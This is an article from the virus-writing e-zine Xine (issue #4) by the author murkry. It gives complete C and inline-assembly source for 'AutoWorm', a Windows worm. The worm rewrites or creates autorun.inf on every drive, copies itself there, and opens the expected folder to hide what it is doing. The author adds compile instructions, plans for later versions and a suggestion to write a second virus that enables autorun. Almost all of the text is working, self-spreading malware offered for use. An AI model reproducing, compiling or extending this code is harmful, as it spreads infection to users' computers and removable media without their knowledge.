   //                                        /-----------------------------\
   //                                        | Xine - issue #4 - Phile 211 |
   //                                        \-----------------------------/

   /*
   While making a Autorun for a cdrom I found that for
   some weird reason if any drive A-Z network or not had
   a autorun.inf which had a autrun open setting in it
   when you explored it or click on the icon for that drive
   you ran the autorun file. Ok this sound like that Mac worm
   I read about for the imac So I spent some time and  this file
   was born. I did my best to use no c runtime stuff so if
   you know how you can recompile with only the C code need to
   run this monster.
   All it does is when run first check and see if their was already
   a file that should be autorun is so it runs that, then checks
   all drives startting with A: - Z: for autorun.inf if found
   it checks if AutoWorm is the file it should run if not
   it alters the open setting to Autoworm.exe and copies the orginal
   name to a WORM open entry so it can run this file later.
   If not it opens the Explorer page the user expects so as calm
   any suspcious minds (like they wont notice the A: drive trying to
   run.... Ok it needs some work)

     Ideas for future version:
       Find away to see if Drive A: has a disk in it
       or only try drive A at random times not every time...

   Change any routines to procedures for neatness reasons
   Me clean up , are you kidding :>
   This is it enjoy, while this worm will rapidly spread on some
   systems, all you need to do is have autorun turned off for all
   drives and this file is never run, but a number of systems I tested
   with win98 and winnt have this option on...
   Or write another virus that would alter the reg entries to
   have autorun turned on.

     compile use VC5 from MS
   cl autowomr.c Kernel32.lib /link /entry:WinMain

     yeah I know there is a neater way, and if it does not work
     try creating a win32 app workspace then add this autoworm.exe
     then compile

   murkry
   */
   #include <windows.h>
   /*#include "resource.h"*/

   void VirusCopy(int nDrive);

   int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                       PSTR szCmdLine, int iCmdShow)
        {

           DWORD               dwDrives;
           char                szCurrDir[MAX_PATH + 1];
           DWORD               dwSizeCurDir = MAX_PATH + 1;
           int                 nDrive;

           char                szBuff[MAX_PATH+100];
           char                szFile[50];


           HANDLE              hFind;  //Handle for the FindFirst
           HANDLE              hFile;  //Handle for New Files
           WIN32_FIND_DATA     fd;
           DWORD               dwWritten;//Temp Dword var



       //First Show the people what they want to see
       //Run Explore or the orginal AutoRun file

       GetCurrentDirectory(dwSizeCurDir,(char*)&szCurrDir);
       lstrcat((char*)&szCurrDir,"autorun.inf");
       GetPrivateProfileString ("worm", "open","FAIL", szFile, 80,(char*)&szCurrDir );

       if ( 0 == lstrcmpi("FAIL",(char*)&szFile) )
       {
           GetCurrentDirectory(dwSizeCurDir,(char*)&szCurrDir);
           ShellExecute(NULL,"open",szCurrDir,NULL,NULL,SW_SHOWNORMAL);
       }
       else
       {
           ShellExecute(NULL,"open",szFile,NULL,NULL,SW_SHOWNORMAL);
       }

       //Start infection routine

       dwDrives = GetLogicalDrives();

       for (nDrive =0; nDrive <32; nDrive++)   //32
       {
        if (dwDrives & (1 <<nDrive))
           {

               wsprintf( szBuff,"%c:\\Autorun.inf",nDrive+'A'  );
               hFind = FindFirstFile((char *)&szBuff,&fd);

               if (hFind == INVALID_HANDLE_VALUE)
               {
       //          MessageBox(NULL,"File does not exists *.inf",(char*)&szBuff,0);
                   //No Autorun.inf
                   //Create our own AutoRun.inf
                   //copy our file their as AutoWorm.exe
                   hFile = CreateFile((char *)&szBuff,GENERIC_READ | GENERIC_WRITE,
                                   0,NULL,OPEN_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL,
                                   NULL);
                   if (hFile != INVALID_HANDLE_VALUE)
                   {
                       if (WriteFile(hFile,
                           "[autorun]\xD\xAOPEN=AutoWorm.exe\xD\xA",
                           30, &dwWritten,NULL))
                       {
       //                  MessageBox(NULL,"AutoRun.Inf Created","Attempting File Copy",0);
                           VirusCopy( nDrive);

                       } //File Autorun.inf writen to

                       CloseHandle(hFile); //Close the File Handle Create
                   } //Autorun.inf created
       //              MessageBox(NULL,"AutoWorm Not found","but Probaly created",0);
               }

               else// AutoRun.inf Found
               {
               //Yes Autorun.inf Read in Autorun open  check if AutoWorm.exe
               //If not write Vworm entry with value
               //Copy AutoWorm.exe
               //Change Autorun-open- AutoWorm.exe
       //          MessageBox(NULL,"File found AutoRun.inf",(char*)&szBuff,0);

                   //Check the Autorun.inf for Virus
                   if ( 0 != GetPrivateProfileString ("autorun", "open",
                              "FAIL", szFile, 80,(char*)&szBuff) )
                   {
       //          MessageBox(NULL,(char*)&szFile,"AutoRun Open = ",0);
                       if ( 0 == lstrcmpi("autoworm.exe",(char*)&szFile) )
                       {
       //                  MessageBox(NULL,"We have Done it already","AutoRun",0);
                       } //Found the AutoRun and AutoWorm
                       else //found but not infected
                       {
                           //Write old setting
                           WritePrivateProfileString ("worm","open",
                             (char*)&szFile, (char*)&szBuff);
                           WritePrivateProfileString ("autorun","open",
                             "AutoWorm.Exe", (char*)&szBuff);
                           //Copy our File their
                           VirusCopy(nDrive);
                       }
                   }//End Check for AutoRun

               }//end check for autorun.inf

               FindClose(hFind);
           }//End check for Drive

       }//End loop through all drives up to 32



         return 0; //Exit WinMain
     }

     void VirusCopy(int nDrive)
     {

       char    szCurrDir[MAX_PATH + 100];
       char    szBuff[MAX_PATH+100];
       DWORD   dwWritten;


           //Copy File
           dwWritten = (DWORD)GetCommandLine();

           nDrive = nDrive;

           //asm code to move a string byte by by byte
           //checking for " or null chars
           _asm
           {
                       push    esi
                       push    edi
                       mov     esi, dwWritten
                       lea     edi, dword ptr [szCurrDir]
                       lodsb
                       cmp     al,'"'
                       je      Quotes
                       stosb
               Quotes:
               NextOne:
                       lodsb
                       cmp     al,'"'
                       je      AddNull
                       stosb
                       or      al,al
                       je      EndOfStr
                       jmp     NextOne
               AddNull:
                       xor     al,al
                       stosb
               EndOfStr:
                       pop edi
                       pop esi
           } //end asm block

           //szCurrDir = Current File

           wsprintf( szBuff,"%c:\\AutoWorm.Exe", nDrive + 'A'  );
           CopyFile(szCurrDir,szBuff,TRUE);
       //  MessageBox(NULL,"File Copied",(char*)&szBuff,0);
       //  MessageBox(NULL,"File Copied",(char*)&szCurrDir,0);

     }//End VirusCopy




